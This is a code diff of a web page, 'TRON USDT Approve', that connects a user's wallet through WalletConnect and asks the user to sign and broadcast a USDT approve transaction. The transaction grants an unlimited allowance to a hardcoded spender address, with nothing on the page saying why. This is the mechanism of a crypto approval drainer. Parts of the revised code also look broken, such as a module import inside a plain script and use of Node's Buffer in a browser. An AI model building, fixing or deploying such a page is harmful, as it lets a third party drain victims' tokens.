@@ -1,33 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>TRON Approve</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TRON USDT Approve</title>
+
 <style>
-body{background:#0a0a0a;color:#fff;text-align:center;font-family:sans-serif;padding:30px}
-.step{margin:10px;padding:10px;background:#111;border-left:4px solid #333}
+body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;padding:30px}
+.card{max-width:520px;margin:auto;background:#111;padding:20px;border-radius:12px}
+.step{padding:10px;margin:10px 0;background:#0d0d0d;border-left:4px solid #333}
 .active{border-color:#f0a500}
 .done{border-color:#22c55e}
 .error{border-color:#ef4444}
+#qr{margin-top:20px}
+#uri{font-size:11px;word-break:break-all;margin-top:10px;color:#aaa}
+a{color:#4da3ff}
 </style>
 </head>
 
 <body>
 
-<h2>TRON USDT Approve</h2>
+<div class="card">
+<h2>🔐 TRON USDT Approve</h2>
 
-<div id="s1" class="step">Connect</div>
+<div id="s1" class="step">Connect Wallet</div>
 <div id="s2" class="step">Wallet</div>
-<div id="s3" class="step">Build</div>
+<div id="s3" class="step">Build TX</div>
 <div id="s4" class="step">Sign</div>
 <div id="s5" class="step">Broadcast</div>
 
 <div id="qr"></div>
-
-<p id="uri"></p>
-<a id="link" target="_blank"></a>
+<div id="uri"></div>
+<a id="openWallet" target="_blank"></a>
 
 <pre id="log"></pre>
+</div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
@@ -39,63 +46,95 @@ const TRONGRID = "https://api.trongrid.io";
 const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
-function step(id,s){document.getElementById(id).className="step "+s}
-function log(t){document.getElementById("log").textContent+=t+"\n"}
+let client;
+let session;
 
-async function toHex(addr){
-  const res = await fetch(TRONGRID+"/wallet/validateaddress",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({address:addr})
-  });
-  const d = await res.json();
-  if(!d.result) throw "Invalid address";
-  return d.hexAddress;
+function step(id,state){
+  document.getElementById(id).className = "step " + state;
 }
 
-async function encodeApprove(){
-  const hex = (await toHex(SPENDER)).slice(2).padStart(64,"0");
-  return "095ea7b3"+hex+"f".repeat(64);
+function log(msg){
+  document.getElementById("log").textContent += msg + "\n";
 }
 
+// 🔥 STABLE BASE58 → HEX (NO API)
+import bs58 from "https://esm.sh/bs58";
+
+function tronToHex(addr){
+  const bytes = bs58.decode(addr);
+  return Buffer.from(bytes).toString("hex").slice(0,42);
+}
+
+// encode approve
+function encodeApprove(spenderHex){
+  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
+  return "095ea7b3" + clean + "f".repeat(64);
+}
+
+// build TX
 async function buildTx(owner){
-  const ownerHex=(await toHex(owner)).slice(2);
+  const ownerHex = tronToHex(owner);
 
-  const res = await fetch(TRONGRID+"/wallet/triggersmartcontract",{
+  const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
-      owner_address:ownerHex,
-      contract_address:USDT_HEX,
+      owner_address: ownerHex,
+      contract_address: USDT_HEX,
       function_selector:"approve(address,uint256)",
-      parameter:await encodeApprove(),
+      parameter: encodeApprove(tronToHex(SPENDER)),
       fee_limit:100000000,
       call_value:0,
       visible:false
     })
   });
 
-  const d=await res.json();
-  return d.transaction;
+  const data = await res.json();
+
+  if(!data.transaction) throw "TX build failed";
+
+  return data.transaction;
 }
 
-function fixSig(resp,tx){
-  if(resp.signature){
-    tx.signature=[resp.signature.replace(/^0x/,"")];
-  }
-  return tx;
-}
-
+// broadcast
 async function broadcast(tx){
-  const r=await fetch(TRONGRID+"/wallet/broadcasttransaction",{
+  const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify(tx)
   });
-  return await r.json();
+  return await res.json();
 }
 
-async function connect(client){
+// fix signature
+function fixSig(resp, tx){
+  if(resp?.signature){
+    tx.signature = Array.isArray(resp.signature)
+      ? resp.signature.map(s => s.replace(/^0x/,""))
+      : [resp.signature.replace(/^0x/,"")];
+  }
+  return tx;
+}
+
+// show QR + link
+function showQR(uri){
+  document.getElementById("qr").innerHTML = "";
+
+  new QRCode(document.getElementById("qr"), {
+    text: uri,
+    width:200,
+    height:200
+  });
+
+  document.getElementById("uri").textContent = uri;
+
+  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
+  document.getElementById("openWallet").href = link;
+  document.getElementById("openWallet").textContent = "Open in Trust Wallet";
+}
+
+// 🔥 SINGLE CONNECT (NO LOOP)
+async function connectWallet(){
   step("s1","active");
 
   const { uri, approval } = await client.connect({
@@ -108,70 +147,71 @@ async function connect(client){
     }
   });
 
-  // QR
-  document.getElementById("qr").innerHTML="";
-  new QRCode(document.getElementById("qr"),{text:uri,width:200,height:200});
+  showQR(uri);
 
-  // fallback link
-  document.getElementById("uri").textContent=uri;
-  const link="https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
-  document.getElementById("link").href=link;
-  document.getElementById("link").textContent="Open in Trust Wallet";
+  session = await approval();
 
-  return await approval();
+  step("s1","done");
 }
 
+// MAIN FLOW
 async function main(){
   try{
     const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
-    const client = await SignClient.init({
-      projectId:PROJECT_ID,
-      metadata:{name:"TRON",description:"approve",url:location.origin,icons:[""]}
+    client = await SignClient.init({
+      projectId: PROJECT_ID,
+      metadata:{
+        name:"TRON Approve",
+        description:"USDT approve",
+        url:location.origin,
+        icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
+      }
     });
 
-    let session;
+    await connectWallet();
 
-    try{
-      session = await connect(client);
-    }catch(e){
-      log("Retry connect...");
-      session = await connect(client); // retry ONCE
-    }
+    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
 
-    step("s1","done");
-
-    const wallet=session.namespaces.tron.accounts[0].split(":")[2];
     step("s2","done");
-    log("Wallet: "+wallet);
+    log("Wallet: " + wallet);
 
     step("s3","active");
-    const tx=await buildTx(wallet);
+
+    const tx = await buildTx(wallet);
+
     step("s3","done");
 
     step("s4","active");
-    const signed=await client.request({
-      topic:session.topic,
-      chainId:TRON_CHAIN,
-      request:{method:"tron_signTransaction",params:{transaction:tx}}
+
+    const signed = await client.request({
+      topic: session.topic,
+      chainId: TRON_CHAIN,
+      request:{
+        method:"tron_signTransaction",
+        params:{ transaction: tx }
+      }
     });
 
-    const finalTx=fixSig(signed,tx);
+    const finalTx = fixSig(signed, tx);
+
     step("s4","done");
 
     step("s5","active");
-    const res=await broadcast(finalTx);
 
-    if(res.result){
+    const result = await broadcast(finalTx);
+
+    if(result.result){
       step("s5","done");
-      log("SUCCESS: "+res.txid);
+      log("SUCCESS: " + result.txid);
     }else{
-      throw JSON.stringify(res);
+      throw JSON.stringify(result);
     }
 
   }catch(e){
     step("s5","error");
-    log("ERROR: "+e);
+    log("ERROR: " + e);
+    console.error(e);
   }
 }
 
